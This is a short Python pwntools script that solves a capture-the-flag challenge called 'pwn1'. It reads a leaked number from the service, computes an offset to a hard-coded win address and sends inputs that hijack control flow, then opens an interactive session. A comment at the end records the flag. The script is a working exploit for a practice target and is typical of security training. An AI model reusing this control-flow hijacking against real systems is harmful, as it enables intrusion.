from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./pwn1')
	raw_input('debug')
else:
	host, port = '203.162.91.5', 6966
	r = remote(host, port)

win_add = '0x08048F56' + '0000'
src = int(win_add, 16)
r.recvuntil('Magic number: ')
res = r.recv(35)
tmp = ''
for i in res:
	if i.isdigit():
		tmp += i
	else:
		break

log.info(tmp)
leak = int(tmp, 10)
dest = leak & 0x0000ffffffffffff
if dest > src:
	offset = 0xffffffffffff + 1 - dest + src
else:
	offset = src - dest

log.info('dest = %#x' %dest)
log.info('src = %#X' %src)
log.info('offset = %#x' %offset)
r.sendlineafter('2. Crash', '1')
r.sendlineafter('Input number to add: ', str(offset))
r.sendlineafter('2. Crash', '2')

r.interactive()
r.close()

# ptitctf{1ts_n0t_4_pWn_chal1}